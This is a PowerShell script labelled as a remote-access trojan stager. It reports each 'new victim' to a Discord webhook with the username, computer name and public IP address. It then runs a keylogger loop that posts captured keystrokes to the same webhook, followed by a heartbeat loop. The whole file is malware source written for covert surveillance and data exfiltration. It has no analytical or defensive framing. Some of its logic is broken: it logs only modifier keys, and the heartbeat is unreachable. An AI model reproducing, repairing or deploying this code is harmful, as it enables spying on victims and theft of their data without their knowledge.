# MuleHack RAT Stager
# Build ID: 31aa2f68
# Created: 2026-08-08T11:25:19.040815

$webhook = "https://discord.com/api/webhooks/your_webhook"
$build_id = "31aa2f68"

function Send-Data {
    param($data)
    try {
        $body = @{content = $data} | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
    } catch {}
}

Send-Data "```diff`n+ NEW VICTIM`n+ Build: $build_id`n+ User: $env:USERNAME`n+ PC: $env:COMPUTERNAME`n+ IP: $(Invoke-RestMethod -Uri 'https://api.ipify.org')`n```"

function Start-Keylogger {
    $log = ""
    while ($true) {
        $keys = [System.Windows.Forms.Keys]
        foreach ($key in [Enum]::GetValues($keys)) {
            if ([System.Windows.Forms.Control]::ModifierKeys -eq $key) {
                $log += "[$key]"
            }
        }
        Start-Sleep -Milliseconds 100
        if ($log.Length -gt 0) {
            Send-Data "```KEYLOG: $log```"
            $log = ""
        }
    }
}

Start-Keylogger

while ($true) {
    Start-Sleep -Seconds 60
    Send-Data "```HEARTBEAT: $env:USERNAME@$env:COMPUTERNAME```"
}
